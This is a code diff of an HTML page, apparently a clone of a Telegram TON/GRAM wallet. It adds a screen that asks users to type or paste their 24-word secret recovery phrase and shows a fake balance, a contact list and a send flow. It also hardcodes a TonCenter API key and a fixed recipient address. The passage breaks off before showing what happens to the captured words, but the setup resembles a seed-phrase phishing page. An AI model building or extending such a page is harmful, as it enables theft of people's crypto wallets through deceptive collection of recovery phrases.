@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TON / GRAM Wallet V5</title>
-    <!-- کتابخانه رسمی TON Connect UI -->
+    <!-- کتابخانه رسمی TON Connect UI برای دیپازیت -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono:wght@500;600;700&family=Share+Tech+Mono&display=swap');
@@ -41,8 +41,8 @@
         }
 
         @keyframes screenFade {
-            from { opacity: 0; transform: translateX(8px); }
-            to { opacity: 1; transform: translateX(0); }
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         /* هدر مشترک */
@@ -84,6 +84,111 @@
             gap: 16px;
         }
 
+        /* ================= صفحه ۰: ورود ۲۴ کلمه بازیابی ولت V5 ================= */
+        .mnemonic-container {
+            padding: 10px 18px 110px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .mnemonic-header-gem {
+            margin: 6px 0 12px;
+            perspective: 500px;
+        }
+
+        .mnemonic-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .mnemonic-subtitle {
+            font-size: 13.5px;
+            color: #6e6e73;
+            text-align: center;
+            line-height: 1.45;
+            margin-bottom: 14px;
+            padding: 0 10px;
+        }
+
+        .mnemonic-quick-actions {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .pill-action-btn {
+            background-color: #e8f0fe;
+            color: #276ef1;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13.5px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .words-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px 12px;
+            width: 100%;
+            background: white;
+            padding: 14px;
+            border-radius: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
+
+        .word-box {
+            display: flex;
+            align-items: center;
+            background: #f4f5f7;
+            border-radius: 12px;
+            padding: 7px 10px;
+            border: 1.5px solid transparent;
+            transition: border-color 0.15s, background 0.15s;
+        }
+
+        .word-box:focus-within {
+            border-color: #4a7dff;
+            background: #ffffff;
+        }
+
+        .word-num {
+            font-size: 12.5px;
+            color: #8e8e93;
+            width: 24px;
+            font-weight: 500;
+            user-select: none;
+        }
+
+        .word-input {
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1c1c1e;
+            text-transform: lowercase;
+        }
+
+        .status-banner {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #e74c3c;
+            text-align: center;
+            min-height: 18px;
+        }
+
         /* ================= صفحه ۱: صفحه اصلی ولت (Money) ================= */
         .card-container {
             padding: 8px 18px 10px;
@@ -93,7 +198,6 @@
             width: 100%;
             height: 212px;
             border-radius: 22px;
-            /* افکت نوری شعاعی دقیقاً منطبق با عکس اول */
             background: 
                 radial-gradient(circle at 66% 44%, rgba(120, 215, 255, 0.88) 0%, rgba(10, 132, 255, 0.35) 38%, transparent 68%),
                 conic-gradient(from 195deg at 64% 46%, #0051a8 0deg, #0077e6 55deg, #004999 120deg, #003777 190deg, #0a84ff 260deg, #0051a8 360deg);
@@ -108,10 +212,9 @@
             justify-content: space-between;
         }
 
-        /* ستاره‌های چهارپر ریز روی کارت */
         .sparkle {
             position: absolute;
-            color: rgba(255, 255, 255, 0.65);
+            color: rgba(255, 255, 255, 0.7);
             font-size: 9px;
             pointer-events: none;
             line-height: 1;
@@ -128,10 +231,12 @@
             gap: 10px;
         }
 
+        /* الماس سفید/یخی روی کارت با ستاره درخشان گوشه پایین راست */
         .card-diamond {
-            width: 28px;
-            height: 28px;
-            filter: drop-shadow(0 1px 6px rgba(255, 255, 255, 0.45));
+            width: 30px;
+            height: 30px;
+            filter: drop-shadow(0 2px 6px rgba(255, 255, 255, 0.4));
+            flex-shrink: 0;
         }
 
         .balance-amount {
@@ -157,7 +262,6 @@
             font-weight: 400;
         }
 
-        /* تراشه نقره‌ای QR روی کارت با آیکون دقیق */
         .card-chip {
             position: absolute;
             right: 52px;
@@ -175,7 +279,6 @@
             z-index: 3;
         }
 
-        /* آدرس عمودی سمت راست کارت */
         .card-vertical-address {
             position: absolute;
             right: 11px;
@@ -201,7 +304,6 @@
             margin-bottom: -2px;
         }
 
-        /* دکمه‌های Add Funds و Send */
         .main-actions {
             display: flex;
             gap: 14px;
@@ -266,15 +368,8 @@
             flex-shrink: 0;
         }
 
-        /* آیکون دایره‌ای سبز با دایره سفید وسط و فلش سبز مثل عکس اول */
-        .tx-icon.out {
-            background-color: #30b856;
-        }
-        /* آیکون دایره‌ای آبی با دایره سفید وسط و فلش آبی مثل عکس اول */
-        .tx-icon.in {
-            background-color: #2787e7;
-        }
-        /* آواتار دایره آبی با نقطه سفید وسط (برای ۲ تراکنش آخر عکس اول) */
+        .tx-icon.out { background-color: #30b856; }
+        .tx-icon.in { background-color: #2787e7; }
         .tx-icon.dot-avatar {
             background: linear-gradient(180deg, #6dc1ea 0%, #449cd6 100%);
             position: relative;
@@ -514,7 +609,6 @@
             border: 1px solid rgba(0,0,0,0.08);
         }
 
-        /* شبیه‌سازی تصویر غروب/افق داخل آواتار عکس سوم */
         .pill-avatar::after {
             content: '';
             position: absolute;
@@ -564,7 +658,7 @@
             cursor: pointer;
         }
 
-        /* بخش مرکزی مبلغ و الماس متحرک */
+        /* بخش مرکزی مبلغ و الماس سه‌بعدی دقیقاً منطبق با عکس سوم */
         .amount-center-area {
             flex: 1;
             display: flex;
@@ -576,41 +670,60 @@
 
         .amount-input-wrapper {
             display: flex;
-            align-items: baseline;
+            align-items: center;
             justify-content: center;
             gap: 10px;
             margin-bottom: 12px;
         }
 
-        /* الماس سه‌بعدی متحرک که تکون میخوره */
+        /* انیمیشن سه‌بعدی الماس آبی عکس سوم */
         .animated-diamond-wrap {
-            align-self: center;
-            perspective: 400px;
-            margin-right: 2px;
+            perspective: 600px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .animated-diamond {
-            width: 44px;
-            height: 44px;
-            animation: gemFloat 2.4s ease-in-out infinite;
-            filter: drop-shadow(0 5px 10px rgba(0, 110, 255, 0.28));
-            transition: transform 0.16s cubic-bezier(0.34, 1.56, 0.64, 1);
+        .gem-3d-svg {
+            width: 48px;
+            height: 46px;
+            transform-style: preserve-3d;
+            animation: telegramGem3D 3.2s ease-in-out infinite;
+            filter: drop-shadow(0 6px 12px rgba(13, 110, 253, 0.28));
+            transition: transform 0.18s cubic-bezier(0.34, 1.56, 0.64, 1);
             cursor: pointer;
         }
 
-        .animated-diamond.bump {
+        .gem-3d-svg.bump {
             animation: none;
-            transform: scale(1.26) rotateY(22deg) rotateZ(-8deg);
+            transform: scale(1.25) rotateY(28deg) rotateX(12deg) rotateZ(-6deg);
         }
 
-        @keyframes gemFloat {
-            0%, 100% { transform: translateY(0px) rotateY(0deg) rotateZ(0deg); }
-            25% { transform: translateY(-5px) rotateY(12deg) rotateZ(-3deg); }
-            50% { transform: translateY(-8px) rotateY(0deg) rotateZ(2deg); }
-            75% { transform: translateY(-4px) rotateY(-12deg) rotateZ(-2deg); }
+        /* درخشش متحرک روی وجه‌های الماس */
+        .gem-shine {
+            animation: facetShimmer 3.2s ease-in-out infinite;
         }
 
-        /* حذف فلش‌های بالا/پایین اینپوت عدد */
+        @keyframes telegramGem3D {
+            0%, 100% {
+                transform: translateY(0px) rotateY(-8deg) rotateX(4deg) rotateZ(0deg);
+            }
+            25% {
+                transform: translateY(-5px) rotateY(14deg) rotateX(-6deg) rotateZ(-3deg);
+            }
+            50% {
+                transform: translateY(-8px) rotateY(4deg) rotateX(8deg) rotateZ(3deg);
+            }
+            75% {
+                transform: translateY(-3px) rotateY(-16deg) rotateX(-4deg) rotateZ(-2deg);
+            }
+        }
+
+        @keyframes facetShimmer {
+            0%, 100% { opacity: 0.85; }
+            50% { opacity: 1; filter: brightness(1.18); }
+        }
+
         .big-amount-input::-webkit-outer-spin-button,
         .big-amount-input::-webkit-inner-spin-button {
             -webkit-appearance: none;
@@ -621,10 +734,10 @@
         }
 
         .big-amount-input {
-            width: 42px;
+            width: 40px;
             border: none;
             outline: none;
-            font-size: 54px;
+            font-size: 55px;
             font-weight: 400;
             color: #8a8a8e;
             text-align: center;
@@ -642,6 +755,7 @@
             font-weight: 400;
             color: #4a7dff;
             letter-spacing: 0.5px;
+            margin-top: 8px;
         }
 
         .usd-equivalent-pill {
@@ -653,11 +767,6 @@
             font-weight: 400;
             margin-bottom: 12px;
             cursor: pointer;
-            transition: transform 0.1s;
-        }
-
-        .usd-equivalent-pill:active {
-            transform: scale(0.95);
         }
 
         .deposit-shortcut-pill {
@@ -750,22 +859,133 @@
 </head>
 <body>
 
-    <!-- SVG مخفی برای استفاده مجدد از آیکون الماس کوچک کنار تراکنش‌ها -->
+    <!-- SVG مخفی برای استفاده مجدد از الماس‌های دقیق عکس ۱ و عکس ۳ -->
     <svg style="display: none;">
+        <!-- ۱. الماس کوچک کنار مبالغ تراکنش‌ها در عکس اول -->
         <symbol id="mini-gem" viewBox="0 0 24 24">
-            <polygon points="12,2 2,9 12,22 22,9" fill="#3290ec"/>
-            <polygon points="12,2 7,9 12,22 17,9" fill="#64b5f6"/>
-            <polygon points="2,9 22,9 12,12" fill="#bbdefb" opacity="0.65"/>
+            <path d="M6.5 3.5 C7.2 2.8 8 2.5 9 2.5 H15 C16 2.5 16.8 2.8 17.5 3.5 L21.5 8.2 C22.2 9 22.2 10.1 21.5 11 L13.4 20.8 C12.6 21.7 11.4 21.7 10.6 20.8 L2.5 11 C1.8 10.1 1.8 9 2.5 8.2 Z" fill="#2c93f2"/>
+            <path d="M7.5 3 L12 9.5 L16.5 3 Z" fill="#7cc6ff"/>
+            <path d="M2.2 9.5 H21.8 L12 11.2 Z" fill="#a8dbff" opacity="0.7"/>
+            <path d="M7.2 9.5 L12 21.3 L16.8 9.5 Z" fill="#1b76d6"/>
+        </symbol>
+
+        <!-- ۲. الماس سه‌بعدی آبی با لبه‌های گرد دقیقاً مطابق عکس سوم -->
+        <symbol id="telegram-3d-gem" viewBox="0 0 100 94">
+            <defs>
+                <!-- گرادینت‌های سه‌بعدی دقیق وجه‌های الماس عکس ۳ -->
+                <linearGradient id="gTopTable" x1="25%" y1="0%" x2="75%" y2="100%">
+                    <stop offset="0%" stop-color="#89ecff"/>
+                    <stop offset="100%" stop-color="#3da5ff"/>
+                </linearGradient>
+                <linearGradient id="gCrownLeft" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stop-color="#6ae3ff"/>
+                    <stop offset="100%" stop-color="#2692ff"/>
+                </linearGradient>
+                <linearGradient id="gCrownMid" x1="20%" y1="0%" x2="80%" y2="100%">
+                    <stop offset="0%" stop-color="#53beff"/>
+                    <stop offset="100%" stop-color="#1978f2"/>
+                </linearGradient>
+                <linearGradient id="gCrownRight" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stop-color="#2183f6"/>
+                    <stop offset="100%" stop-color="#074bb8"/>
+                </linearGradient>
+                <linearGradient id="gPavLeft" x1="15%" y1="0%" x2="85%" y2="100%">
+                    <stop offset="0%" stop-color="#3ca4ff"/>
+                    <stop offset="100%" stop-color="#1264d8"/>
+                </linearGradient>
+                <linearGradient id="gPavMid" x1="50%" y1="0%" x2="50%" y2="100%">
+                    <stop offset="0%" stop-color="#2589f8"/>
+                    <stop offset="100%" stop-color="#0a49b0"/>
+                </linearGradient>
+                <linearGradient id="gPavRight" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stop-color="#0f58c7"/>
+                    <stop offset="100%" stop-color="#032b77"/>
+                </linearGradient>
+            </defs>
+
+            <!-- silhouette کلی الماس با گوشه‌های گرد -->
+            <g class="gem-shine">
+                <!-- وجه پایینی چپ (Pavilion Left) -->
+                <path d="M5.5 34.5 L33 38.5 L49.5 89.5 C46.5 89.2 44.2 87.5 42 84.5 L6.2 40.5 C4.2 38 4.2 35.8 5.5 34.5 Z" fill="url(#gPavLeft)"/>
+                
+                <!-- وجه پایینی راست (Pavilion Right) -->
+                <path d="M94.5 34.5 L67 38.5 L50.5 89.5 C53.5 89.2 55.8 87.5 58 84.5 L93.8 40.5 C95.8 38 95.8 35.8 94.5 34.5 Z" fill="url(#gPavRight)"/>
+
+                <!-- وجه پایینی وسط (Pavilion Center) -->
+                <path d="M32.5 38 L67.5 38 L52.5 88.2 C51.2 90.5 48.8 90.5 47.5 88.2 Z" fill="url(#gPavMid)"/>
+
+                <!-- وجه تاج چپ (Crown Left) -->
+                <path d="M26 11.5 C23.2 12 21 13.8 19 16.2 L5.5 32.8 C4.2 34.5 4.8 36 7 36.2 L33 38.5 L34.5 14 Z" fill="url(#gCrownLeft)"/>
+
+                <!-- وجه تاج راست (Crown Right) -->
+                <path d="M74 11.5 C76.8 12 79 13.8 81 16.2 L94.5 32.8 C95.8 34.5 95.2 36 93 36.2 L67 38.5 L65.5 14 Z" fill="url(#gCrownRight)"/>
+
+                <!-- وجه تاج وسط (Crown Center) -->
+                <path d="M34 15.5 L66 15.5 L67.5 38.5 L32.5 38.5 Z" fill="url(#gCrownMid)"/>
+
+                <!-- سطح صاف بالای الماس (Top Table) -->
+                <path d="M29 10.5 H71 C74 10.5 75.5 12 73 14 L66 17.5 H34 L27 14 C24.5 12 26 10.5 29 10.5 Z" fill="url(#gTopTable)"/>
+
+                <!-- خط براق افقی وسط الماس (Girdle Highlight) -->
+                <path d="M6 34.8 Q50 40.5 94 34.8" stroke="rgba(255,255,255,0.42)" stroke-width="1.3" fill="none" stroke-linecap="round"/>
+                <!-- خط نورانی روی یال چپ -->
+                <path d="M34 16.5 L32.8 38.2 L49.2 87" stroke="rgba(175,235,255,0.45)" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+            </g>
         </symbol>
     </svg>
 
     <!-- ================================================================= -->
-    <!-- صفحه ۱: صفحه اصلی ولت (Money) -->
+    <!-- صفحه ۰: وارد کردن ۲۴ کلمه بازیابی ولت V5 (Secret Recovery Phrase) -->
     <!-- ================================================================= -->
-    <div id="screen-home" class="screen active">
+    <div id="screen-mnemonic" class="screen active">
         <div class="header">
             <div class="header-left">
-                <button class="icon-btn">
+                <button class="icon-btn" onclick="skipToDemoWallet()" title="بازگشت به ولت">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                </button>
+                <span class="header-title">Wallet V5R1 Login</span>
+            </div>
+        </div>
+
+        <div class="mnemonic-container">
+            <div class="mnemonic-header-gem">
+                <svg class="gem-3d-svg" style="width:62px; height:58px;"><use href="#telegram-3d-gem"/></svg>
+            </div>
+            <div class="mnemonic-title">24 Secret Words (V5)</div>
+            <div class="mnemonic-subtitle">
+                ۲۴ کلمه بازیابی ولت <b>V5R1</b> خودت رو وارد کن تا مستقیم به شبکه TON و API تان-سنتر وصل بشه:
+            </div>
+
+            <div class="mnemonic-quick-actions">
+                <button class="pill-action-btn" onclick="pasteAll24Words()">
+                    📋 Paste 24 Words
+                </button>
+                <button class="pill-action-btn" style="background:#f2f3f5; color:#555;" onclick="clearAll24Words()">
+                    پاک کردن
+                </button>
+            </div>
+
+            <!-- گرید ۲۴ کلمه -->
+            <div class="words-grid" id="words-grid"></div>
+
+            <div class="status-banner" id="mnemonic-status"></div>
+        </div>
+
+        <div class="bottom-fixed-bar">
+            <button id="import-v5-btn" class="primary-bottom-btn" onclick="importWalletV5()">Continue (Import Wallet V5)</button>
+            <button onclick="skipToDemoWallet()" style="background:none; border:none; color:#6e6e73; font-size:13px; cursor:pointer; padding:4px;">
+                رد شدن و مشاهده مستقیم رابط کاربری (حالت پیش‌فرض عکس)
+            </button>
+        </div>
+    </div>
+
+    <!-- ================================================================= -->
+    <!-- صفحه ۱: صفحه اصلی ولت (Money) -->
+    <!-- ================================================================= -->
+    <div id="screen-home" class="screen">
+        <div class="header">
+            <div class="header-left">
+                <button class="icon-btn" onclick="showScreen('screen-mnemonic')">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                 </button>
                 <span class="header-title">Money</span>
@@ -777,7 +997,8 @@
                         <line x1="7" y1="12" x2="17" y2="12"/>
                     </svg>
                 </button>
-                <button class="icon-btn">
+                <!-- دکمه سه‌نقطه برای باز کردن صفحه ۲۴ کلمه -->
+                <button class="icon-btn" onclick="showScreen('screen-mnemonic')" title="تنظیم ۲۴ کلمه ولت V5">
                     <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
                 </button>
             </div>
@@ -785,22 +1006,25 @@
 
         <div class="card-container">
             <div class="ton-card">
-                <!-- ستاره‌های ریز روی کارت دقیقاً در موقعیت عکس اول -->
                 <span class="sparkle" style="bottom: 62px; left: 26px;">✦</span>
                 <span class="sparkle" style="bottom: 70px; left: 78px;">✦</span>
                 <span class="sparkle" style="bottom: 18px; left: 26px; opacity: 0.45;">✦</span>
 
                 <div class="card-balance-section">
                     <div class="balance-row">
-                        <!-- آیکون الماس روشن روی کارت -->
-                        <svg class="card-diamond" viewBox="0 0 56 56" fill="none">
-                            <polygon points="28,5 5,22 28,51 51,22" fill="url(#cardGemGrad)"/>
-                            <polygon points="28,5 16,22 28,51 40,22" fill="#ffffff" opacity="0.45"/>
-                            <polygon points="5,22 51,22 28,28" fill="#ffffff" opacity="0.6"/>
+                        <!-- الماس سفید/یخی روی کارت با ستاره چهارپر روی لبه پایین-راست دقیقاً مثل عکس اول -->
+                        <svg class="card-diamond" viewBox="0 0 60 60" fill="none">
+                            <path d="M16 10 C18 8 20 7.5 23 7.5 H37 C40 7.5 42 8 44 10 L54 22 C56 24.5 56 27 54 29.5 L33.5 53 C31.5 55.5 28.5 55.5 26.5 53 L6 29.5 C4 27 4 24.5 6 22 Z" fill="url(#cardWhiteGem)"/>
+                            <path d="M19 8.5 L30 25 L41 8.5 Z" fill="#ffffff" opacity="0.85"/>
+                            <path d="M5.5 25.5 H54.5 L30 30 Z" fill="#ffffff" opacity="0.65"/>
+                            <path d="M18.5 25.5 L30 54 L41.5 25.5 Z" fill="#b3e0ff" opacity="0.55"/>
+                            <!-- ستاره درخشان چهارپر روی ضلع پایین راست الماس کارت طبق عکس ۱ -->
+                            <path d="M43 34 L44.8 39.2 L50 41 L44.8 42.8 L43 48 L41.2 42.8 L36 41 L41.2 39.2 Z" fill="#ffffff"/>
                             <defs>
-                                <linearGradient id="cardGemGrad" x1="5" y1="5" x2="51" y2="51" gradientUnits="userSpaceOnUse">
-                                    <stop stop-color="#ffffff"/>
-                                    <stop offset="1" stop-color="#9be2ff"/>
+                                <linearGradient id="cardWhiteGem" x1="6" y1="8" x2="54" y2="54" gradientUnits="userSpaceOnUse">
+                                    <stop offset="0%" stop-color="#ffffff"/>
+                                    <stop offset="55%" stop-color="#d8f0ff"/>
+                                    <stop offset="100%" stop-color="#8ccbff"/>
                                 </linearGradient>
                             </defs>
                         </svg>
@@ -812,7 +1036,7 @@
                     <div class="balance-usd" id="main-usd">$0.02</div>
                 </div>
 
-                <!-- تراشه نقره‌ای وسط کارت با آیکون دقیق عکس اول -->
+                <!-- تراشه نقره‌ای وسط کارت -->
                 <div class="card-chip" onclick="openDepositModal()">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#5c6470" stroke-width="1.8">
                         <rect x="4" y="4" width="6" height="6" rx="1.2"/>
@@ -825,7 +1049,7 @@
                 </div>
 
                 <!-- آدرس عمودی V5 سمت راست کارت -->
-                <div class="card-vertical-address">
+                <div class="card-vertical-address" id="card-vert-addr">
                     UQDb GLVQ KWDC -WVB GGGG IUXO<br>
                     CPOH EARY HATM CCME 1ZDV GXUA
                 </div>
@@ -834,7 +1058,6 @@
             </div>
         </div>
 
-        <!-- دکمه‌های Add Funds و Send -->
         <div class="main-actions">
             <button class="action-btn" onclick="openDepositModal()">Add Funds</button>
             <button class="action-btn" onclick="showScreen('screen-recipient')">Send</button>
@@ -933,7 +1156,7 @@
     </div>
 
     <!-- ================================================================= -->
-    <!-- صفحه ۲: انتخاب گیرنده (Send Grams) - دقیقاً مطابق تصویر دوم -->
+    <!-- صفحه ۲: انتخاب گیرنده (Send Grams) -->
     <!-- ================================================================= -->
     <div id="screen-recipient" class="screen">
         <div class="header">
@@ -962,7 +1185,6 @@
         <div class="recent-box">
             <div class="box-label">Recent</div>
 
-            <!-- 1. Ali Spider -->
             <div class="contact-item" onclick="selectRecipient('Mr.Sadra @GIFTSDouble')">
                 <div class="avatar" style="background: radial-gradient(circle at 50% 40%, #555, #111);">
                     <span style="font-size:20px; filter:grayscale(1);">🕷️</span>
@@ -970,7 +1192,6 @@
                 <div class="contact-info">
                     <div class="contact-name" style="font-family: 'Roboto Mono', monospace; font-weight: 700; font-size: 14.5px;">
                         Ali Spider
-                        <!-- بج کریستال بنفش/نارنجی -->
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                             <polygon points="12,2 4,9 8,21 16,21 20,9" fill="url(#crystalGrad)"/>
                             <polygon points="12,2 9,11 12,21 15,11" fill="#ff9ff3" opacity="0.6"/>
@@ -987,13 +1208,11 @@
                 </div>
             </div>
 
-            <!-- 2. S. Shakib -->
             <div class="contact-item" onclick="selectRecipient('Mr.Sadra @GIFTSDouble')">
                 <div class="avatar" style="background: linear-gradient(180deg, #ffb142, #ee8c25);">S.</div>
                 <div class="contact-info">
                     <div class="contact-name">
                         S. Shakib
-                        <!-- بج آبی کنار اسم -->
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                             <path d="M4 16C4 10 10 5 19 4C16 9 16 13 19 17C13 17 8 18 4 16Z" fill="#2e6be6"/>
                             <path d="M8 14L17 8M10 16L18 12" stroke="white" stroke-width="1.8" stroke-linecap="round"/>
@@ -1003,7 +1222,6 @@
                 </div>
             </div>
 
-            <!-- 3. . (@Vnkuddc) -->
             <div class="contact-item" onclick="selectRecipient('Mr.Sadra @GIFTSDouble')">
                 <div class="avatar tx-icon dot-avatar" style="width:46px; height:46px;"></div>
                 <div class="contact-info">
@@ -1012,7 +1230,6 @@
                 </div>
             </div>
 
-            <!-- 4. Mahdie Khale -->
             <div class="contact-item" onclick="selectRecipient('Mahdie Khale @W_pang7')">
                 <div class="avatar" style="background: radial-gradient(circle, #485460, #1e272e); border: 1.5px solid #d2a679;">
                     <span style="font-size:21px;">👾</span>
@@ -1023,7 +1240,6 @@
                 </div>
             </div>
 
-            <!-- 5. Portal -->
             <div class="contact-item" onclick="selectRecipient('Portal @GiftsToPortals')">
                 <div class="avatar" style="background: linear-gradient(180deg, #54a8ff, #2780e3);">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
@@ -1033,13 +1249,11 @@
                 </div>
                 <div class="contact-info">
                     <div class="contact-name">
-                        <!-- بج تاج آبی در سمت چپ -->
                         <svg width="17" height="17" viewBox="0 0 24 24" fill="#4a7dff">
                             <circle cx="12" cy="12" r="10"/>
                             <path d="M7 15h10l1-6-3.5 2.5L12 8l-2.5 3.5L6 9l1 6z" fill="white"/>
                         </svg>
                         Portal
-                        <!-- تیک آبی در سمت راست -->
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="#4a7dff">
                             <path d="M12 2l2.4 2.1 3.1-.4 1.2 2.9 3 1.2-.4 3.1 2.1 2.4-2.1 2.4.4 3.1-3 1.2-1.2 2.9-3.1-.4L12 22l-2.4-2.1-3.1.4-1.2-2.9-3-1.2.4-3.1L.6 12l2.1-2.4-.4-3.1 3-1.2 1.2-2.9 3.1.4L12 2z"/>
                             <path d="M9 12l2 2 4-4" stroke="white" stroke-width="2" fill="none" stroke-linecap="round"/>
@@ -1049,7 +1263,6 @@
                 </div>
             </div>
 
-            <!-- 6. Father -->
             <div class="contact-item" onclick="selectRecipient('Father @Heydar6111')">
                 <div class="avatar" style="background: linear-gradient(180deg, #82cc59, #57b147);">F</div>
                 <div class="contact-info">
@@ -1058,7 +1271,6 @@
                 </div>
             </div>
 
-            <!-- 7. Daii -->
             <div class="contact-item" onclick="selectRecipient('Daii @katanaforu')">
                 <div class="avatar" style="background: linear-gradient(180deg, #d2dae2, #808e9b);">
                     <span style="font-size:22px;">🤵🏻‍♂️</span>
@@ -1069,7 +1281,6 @@
                 </div>
             </div>
 
-            <!-- 8. Simin Ros -->
             <div class="contact-item" onclick="selectRecipient('Simin Ros')">
                 <div class="avatar" style="background: linear-gradient(180deg, #f37999, #e15b83);">SR</div>
                 <div class="contact-info">
@@ -1077,7 +1288,6 @@
                 </div>
             </div>
 
-            <!-- 9. AMIN ×Abn -->
             <div class="contact-item" onclick="selectRecipient('AMIN ×Abn')">
                 <div class="avatar" style="background: linear-gradient(180deg, #4cd137, #0097e6);">
                     <span style="font-size:20px;">🏕️</span>
@@ -1094,7 +1304,7 @@
     </div>
 
     <!-- ================================================================= -->
-    <!-- صفحه ۳: وارد کردن مبلغ و الماس متحرک (Send Money to) -->
+    <!-- صفحه ۳: وارد کردن مبلغ و الماس سه‌بعدی (Send Money to) -->
     <!-- ================================================================= -->
     <div id="screen-amount" class="screen screen-white">
         <div class="header">
@@ -1105,42 +1315,29 @@
                 <span class="header-title">Send Money to</span>
             </div>
             <div class="header-right">
-                <button class="icon-btn">
+                <button class="icon-btn" onclick="showScreen('screen-mnemonic')" title="تنظیم ۲۴ کلمه ولت V5">
                     <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
                 </button>
             </div>
         </div>
 
-        <!-- کپسول مشخصات گیرنده مطابق تصویر سوم -->
         <div class="recipient-pill">
             <div class="pill-avatar"></div>
             <div class="pill-info">
                 <div class="pill-name" id="selected-recipient-name">Mr.Sadra @GIFTSDouble</div>
-                <div class="pill-address">
+                <div class="pill-address" id="pill-formatted-address">
                     UQDb glvq KwDc <b>-wVB</b> gGgG <b>iuXo</b><br>
                     <b>cpoh</b> eAry <b>hatM</b> CCMe <b>1zDv</b> GXUA
                 </div>
             </div>
-            <div class="help-circle" title="Wallet V5 Non-bounceable Address">?</div>
+            <div class="help-circle">?</div>
         </div>
 
-        <!-- بخش وسط صفحه با الماس متحرک -->
+        <!-- بخش وسط صفحه با الماس سه‌بعدی دقیقاً منطبق با عکس سوم -->
         <div class="amount-center-area">
             <div class="amount-input-wrapper" onclick="document.getElementById('send-amount-input').focus()">
                 <div class="animated-diamond-wrap" onclick="triggerGemSpin()">
-                    <!-- الماس سه‌بعدی چندوجهی دقیقاً مثل تصویر سوم -->
-                    <svg id="moving-diamond" class="animated-diamond" viewBox="0 0 64 64" fill="none">
-                        <!-- تاج بالایی الماس -->
-                        <polygon points="18,12 46,12 58,24 6,24" fill="#63b8ff"/>
-                        <polygon points="18,12 32,24 6,24" fill="#3a95f5"/>
-                        <polygon points="46,12 58,24 32,24" fill="#1e78e8"/>
-                        <polygon points="18,12 46,12 32,24" fill="#99d6ff"/>
-                        <!-- بدنه پایینی الماس -->
-                        <polygon points="6,24 32,24 32,56" fill="#1565c0"/>
-                        <polygon points="58,24 32,24 32,56" fill="#0d47a1"/>
-                        <polygon points="18,24 46,24 32,56" fill="#2185ef"/>
-                        <polygon points="24,24 40,24 32,56" fill="#4da3ff" opacity="0.75"/>
-                    </svg>
+                    <svg id="moving-diamond" class="gem-3d-svg"><use href="#telegram-3d-gem"/></svg>
                 </div>
 
                 <input type="number" id="send-amount-input" class="big-amount-input" value="0" min="0" step="any" oninput="onAmountInput(this)">
@@ -1168,10 +1365,9 @@
         <div class="modal-sheet" onclick="event.stopPropagation()">
             <div class="modal-title">Deposit via TON Connect (Wallet V5)</div>
             <p style="font-size: 13px; color:#666; text-align:center;">
-                ولت خودت رو وصل کن تا مستقیم به آدرس V5 زیر دیپازیت انجام بدی:
+                ولت خودت رو با TON Connect وصل کن تا مستقیم به آدرس V5 دیپازیت انجام بدی:
             </p>
 
-            <!-- دکمه رسمی TON Connect -->
             <div id="ton-connect-button"></div>
 
             <div class="v5-address-box" id="v5-target-address">
@@ -1186,15 +1382,146 @@
     </div>
 
     <script>
-        // ۱. تنظیمات آدرس ولت V5 و API Key تان-سنتر که فرستادی
-        const MY_WALLET_V5_ADDRESS = "UQDbglvqKwDc-wVBgGgGiuXocpoheAryhatMCCMe1zDvGXUA";
+        // ۱. تنظیمات آدرس پیش‌فرض V5 و کلید API تان-سنتر
+        let MY_WALLET_V5_ADDRESS = "UQDbglvqKwDc-wVBgGgGiuXocpoheAryhatMCCMe1zDvGXUA";
         const TONCENTER_API_KEY = "bfa95e037951db31385ba7b19d029d67103741286d637c9b3f4e4a9ca776bd5d";
 
+        let userMnemonicWords = [];
+        let derivedKeyPair = null;
         let currentBalance = 0.016;
         const GRAM_USD_PRICE = 1.25;
         let isUsdInputMode = false;
 
-        // ۲. راه‌اندازی TON Connect UI
+        // ۲. ساختن ۲۴ باکس ورودی کلمات بازیابی در صفحه اول
+        const wordsGrid = document.getElementById('words-grid');
+        for (let i = 1; i <= 24; i++) {
+            const box = document.createElement('div');
+            box.className = 'word-box';
+            box.innerHTML = `
